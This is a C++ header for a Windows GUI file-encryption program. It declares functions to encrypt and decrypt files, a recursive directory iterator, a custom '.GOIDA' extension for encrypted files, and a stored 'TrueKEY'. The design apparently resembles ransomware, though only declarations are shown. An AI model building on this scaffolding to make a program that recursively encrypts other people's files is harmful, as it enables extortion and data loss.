#pragma once

const char CLASS_NAME[] = "CLASS_NAME";

#define ENCFILE_EX ".GOIDA"
#define DIR		   "DIR"

#define CHECKFILEEX(DIR) ( (fs::path)DIR.filename().extension() == ENCFILE_EX )

#define WindowSize  724
#define ButtonID    1
#define EditBoxID   2

#include <iostream>
#include <windows.h>
#include <filesystem>
#include <fstream>
#include <string>

#include "CryptLib/Cryptor.hpp"
#include "../Resource/resource.h"

namespace fs = std::filesystem;
using recursive_directory_iterator = fs::recursive_directory_iterator;

LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

WNDCLASSEX InitWNDCLASS(HINSTANCE hInstance, const char CLASS_NAME[], WNDPROC WindowProc);
void CreateWidget(HWND hwnd);

bool CryptFile(const std::string& FileNameForEncryption, cryptor::KEY_TYPE& KEY, const std::string& FILE_Extension);
bool DeCryptFile(const std::string& FileNameForDecryption, cryptor::KEY_TYPE& KEY, const std::string& FILE_Extension);

extern cryptor::KEY_TYPE TrueKEY;